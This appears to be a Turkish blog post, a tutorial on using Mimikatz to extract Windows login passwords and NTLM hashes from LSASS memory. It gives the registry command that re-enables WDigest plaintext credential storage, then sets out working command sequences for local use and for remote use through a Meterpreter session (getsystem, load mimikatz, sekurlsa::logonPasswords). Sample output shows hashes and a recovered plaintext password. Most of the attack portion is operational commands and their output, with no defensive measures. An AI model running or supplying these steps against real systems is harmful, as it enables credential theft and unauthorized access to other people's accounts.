@@ -1,0 +1,183 @@
+I"q)<p>Merhaba, bugünkü yazımda <a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a> isimli tool ile Windows sistemlerde kullanıcı parolalarını elde etmekten bahsedeceğim. <u>DİKKAT: Mimikatz'ı kullanabilmek için yönetici haklarına sahip olmanız gerekmektedir.</u></p>
+
+<p>Kendisini anlatmadan önce Windows sistemler hakkında birkaç bilgi vermeliyim. Hadi başlayalım…</p>
+
+<h2 id="windows-sistemlerde-parolaların-saklanması">Windows Sistemlerde Parolaların Saklanması</h2>
+
+<p>Windows sistemlerde, tahmin edeceğiniz gibi parolalar text olarak (açık halde) tutulmuyor,  şifrelenerek kaydediliyor.
+Oturum açma sırasında, kullanıcı adı ve parola kontrolünü System32 dizini altında bulunan LSASS.exe (Local Security Authority Subsystem Service) üstleniyor. Kontrol sırasında, kullanıcıdan alınan veriler <a href="https://en.wikipedia.org/wiki/Security_Account_Manager">SAM</a> (Security Account Manager) ve <a href="https://www.varonis.com/blog/the-difference-between-active-directory-and-ldap/">LDAP</a> (Lightweight Directory Access Protocol) dosyasındaki veriler ile karşılaştırılıyor. Eğer veriler eşleşir ise, kullanıcı sisteme dahil edilirken aynı zamanda kullanıcıya ait parola bilgisi de (NTLM Hash ve şifrelenmiş parola) hafızada saklanır.</p>
+
+<p>Eğer hafızadaki o veri ele geçirilip başka bir LSASS oturumuna enjekte edilirse kimlik doğrulama aşaması atlatılarak sisteme giriş yapılabilir.</p>
+
+<h2 id="önemli-bir-nokta">Önemli Bir Nokta</h2>
+
+<p>Belirtmekte fayda gördüğüm bir nokta var. Mimikatz Windows 8.1 ve üstü sürümlerde bu zaafiyet direkt olarak sömürülemiyor. Birkaç önlem alınmış. Ancak tabiki atlatılabilir bir önlem.</p>
+
+<p>Eğer Windows 8.1 sonrası bir sürümü kullanıyorsanız ya da KB2871997 güncellemesini yüklediyseniz, aşağıdaki aşamalara geçmeden önce yönetici olarak Windows Shell’de şu komutu çalıştırmalısınız. Çünkü “UseLogonCredential” DWORD değeri regeditte gözükmez.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
+</code></pre></div></div>
+
+<p>Bu adım da Wimdows 8.1 ve üstü sürümleri kullananlar için geçerli. Oturumu kapatıp açmanız gerekiyor. İşin ironik kısmı burası. Bizim amacımız parolayı elde etmek iken, bunu nasıl yapacağız. Açıkçası yapılması gereken şey, oturumun tekrar açılmasını sağlayarak Mimikatz’ın parolaya ulaşabilmesini sağlamak. Burada yapılması gerekeni sizlere bırakıyorum.</p>
+
+<p>Şimdi asıl işimize dönebiliriz.</p>
+
+<h2 id="mimikatzın-fiziksel-saldırılarda-kullanımı">Mimikatz’ın Fiziksel Saldırılarda kullanımı</h2>
+
+<p>Burada, bilgisayara fiziksel erişiminizin olduğunu düşünüyoruz. İlk yapmanız gereken Mimikatz’ı indirmek. <a href="https://github.com/gentilkiwi/mimikatz/releases">Şu</a> linkten zip dosyasını indirerek exe dosyasına ulaşabilirsiniz.</p>
+
+<p>İndirdikten sonra programı açıyoruz ve Mimikatz bizi komut satırında karşılıyor. Hiç beklemeden ilk komutumuzu “privilege::debug” çalıştıralım</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  Microsoft Windows [Version 6.1.7600]
+  Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+  C:&gt;cd x64
+  C:x64&gt;mimikatz.exe
+  mimikatz 1.0 x64 (RC)   Traitement du Kiwi (Jan 23 2013 00:14:12)
+  http://blog.gentilkiwi.com/mimikatz
+
+  mimikatz# privilege::debug
+  Demande d’ACTIVATION du privilège : SeDebugPrivilege : OK
+</code></pre></div></div>
+
+<p>Ardından, bilgileri elde etmek için “sekurlsa::logonPasswords” komutumuzu çalıştırıyoruz. (Buradaki kodların bir kısmı Celal Erdik’in <a href="https://www.bgasecurity.com/2013/01/mimikatz-ile-windows-sistemlerde/">BGA’daki</a> yazısından alınmıştır. Verdiği bilgilerden ötürü teşekkür ederim.)</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  mimikatz# sekurlsa::logonPasswords full
+
+  Authentification Id         : 0;431139
+  Package d’authentification  : NTLM
+  Utilisateur principal       : F. Celal ERDIK
+  Domaine d’authentification  : fcerdix
+  msv1_0
+  * Utilisateur  : F. Celal ERDIK
+  * Domaine      : fcerdix
+  * Hash LM      : d1face09e47d03f8aad3b435b51404ee
+  * Hash NTLM    : 7d029e287d0e7372ce126253b626f537
+  kerberos
+  * Utilisateur  : F. Celal ERDIK
+  * Domaine      : fcerdix
+  * Mot de passe : BenimGizliParolam
+  ssp
+  wdigest
+  * Utilisateur  : F. Celal ERDIK
+  * Domaine      : fcerdix
+  * Mot de passe : BenimGizliParolam
+  tspkg
+  * Utilisateur  : F. Celal ERDIK
+  * Domaine      : fcerdix
+  * Mot de passe : BenimGizliParolam
+</code></pre></div></div>
+
+<p>Yukarıda görmüş olduğunuz üzere parola “BenimGizliParolam”dır.</p>
+
+<h2 id="mimikatzın-uzaktan-kullanımı">Mimikatz’ın Uzaktan Kullanımı</h2>
+
+<p>Benim anlatacağım uzaktan erişimde, herhangi bir şekilde hedefte meterpreter oturumu elde edilmiş olmalıdır. Eğer bunu nasıl yapacağınızı bilmiyorsanız şu an sadece mantığını anlamaya çalışmanızı tavsiye ederim.</p>
+
+<p>Meterpreter oturumumuzda ilk önce “getsystem” yazarak sistem derecesinde yetki elde edelim. Bunu kontrol etmek için de “getuid” komutu kullanılabilir. Eğer “getuid” komutunun çıktısında “AUTHORTY\SYSTEM” ifadesini görürseniz, diğer işlemlere devam edebilirsiniz.</p>
+
+<p>Şimdi “load mimikatz” diyerek Mimikatz’ı yükleyelim.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  meterpreter &gt; load mimikatz
+  Loading extension mimikatz...success.
+</code></pre></div></div>
+
+<p>Başarılı bir şekilde yüklememizi gerçekleştirdik. “help mimikatz” ile, mimikatz komutları hakkında bilgi alabilirsiniz.</p>
+
+<p>meterpreter &gt; help mimikatz</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  Mimikatz Commands
+  =================
+
+      Command           Description
+      -------           -----------
+      kerberos          Attempt to retrieve kerberos creds
+      livessp           Attempt to retrieve livessp creds
+      mimikatz_command  Run a custom commannd
+      msv               Attempt to retrieve msv creds (hashes)
+      ssp               Attempt to retrieve ssp creds
+      tspkg             Attempt to retrieve tspkg creds
+      wdigest           Attempt to retrieve wdigest creds
+</code></pre></div></div>
+
+<p>Mimikatz sadece bunlardan ibaret değil. İçerisinde birçok modül de vardır. Modüllere bakmanın herhangi bir “normal” şekli var mı bilmiyorum ancak yanlış bir modül ismi girerek modüllere ulaşabilirsiniz.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      meterpreter &gt; mimikatz_command -f FAATIIHH::
+      Module : 'FAATIIHH' introuvable
+
+      Modules disponibles :
+                      - Standard
+            crypto    - Cryptographie et certificats
+              hash    - Hash
+            system    - Gestion système
+           process    - Manipulation des processus
+            thread    - Manipulation des threads
+           service    - Manipulation des services
+         privilege    - Manipulation des privilèges
+            handle    - Manipulation des handles
+       impersonate    - Manipulation tokens d'accès
+           winmine    - Manipulation du démineur
+       minesweeper    - Manipulation du démineur 7
+             nogpo    - Anti-gpo et patchs divers
+           samdump    - Dump de SAM
+            inject    - Injecteur de librairies
+                ts    - Terminal Server
+            divers    - Fonctions diverses n'ayant pas encore assez de corps pour avoir leurs propres module
+          sekurlsa    - Dump des sessions courantes par providers LSASS
+               efs    - Manipulations EFS
+</code></pre></div></div>
+
+<p>Parolayı elde etmek için</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    meterpreter&gt; mimikatz_command -f sekurlsa::logonPasswords -a "full"
+</code></pre></div></div>
+
+<p>komutunu kullanarak, fiziksel sistemdeki gibi bir çıktı ile parolayı elde edebilirsiniz.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        Authentification Id         : 0;431139
+        Package d’authentification  : NTLM
+        Utilisateur principal       : F. Celal ERDIK
+        Domaine d’authentification  : fcerdix
+        msv1_0
+        * Utilisateur  : F. Celal ERDIK
+        * Domaine      : fcerdix
+        * Hash LM      : d1face09e47d03f8aad3b435b51404ee
+        * Hash NTLM    : 7d029e287d0e7372ce126253b626f537
+        kerberos
+        * Utilisateur  : F. Celal ERDIK
+        * Domaine      : fcerdix
+        * Mot de passe : BenimGizliParolam
+        ssp
+        wdigest
+        * Utilisateur  : F. Celal ERDIK
+        * Domaine      : fcerdix
+        * Mot de passe : BenimGizliParolam
+        tspkg
+        * Utilisateur  : F. Celal ERDIK
+        * Domaine      : fcerdix
+        * Mot de passe : BenimGizliParolam
+</code></pre></div></div>
+
+<h2 id="bonus">Bonus</h2>
+
+<p>Mimikatz’ın, parolayı elde etmek için hafızadaki verileri kullandığını belirtmiştik. Aynı şekilde mayın tarlası oyunun içeriği de hafızada güncel olarak saklanır. Eğer mayın tarlası oyununu başlatıp, Mimikatz’da şu</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        mimikatz_command –f winmine::infos
+</code></pre></div></div>
+
+<p>komutu çalıştırırsanız bombaların yerini görebilirsiniz. Bu şekilde de oyunu rahatlıkla bitirirsiniz :)</p>
+
+<p><strong>Fatih Furkan Hatipoğlu</strong></p>
+
+<p> </p>
+
+<p>Bana bu kadar bilgi yetmez, daha fazlasını istiyorum diyenler için birkaç tavsiye kaynak:</p>
+
+<p><a href="https://www.bgasecurity.com/2013/01/mimikatz-ile-windows-sistemlerde/">BGA - Mimikatz ile Windows Sistemlerde Parolaları Açık Olarak Okuma</a></p>
+
+<p><a href="https://canyoupwn.me/tr-mimikatz/">CanYouPwnMe - Mimikatz </a></p>
+
+<p><a href="https://siberoloji.github.io/metaspliot-framework-mimikatz/">Siberoloji - MSF Mimikatz </a></p>
+
+<p><a href="https://www.varonis.com/blog/what-is-mimikatz/">Varonis - What is Mimikatz</a></p>
+:ET
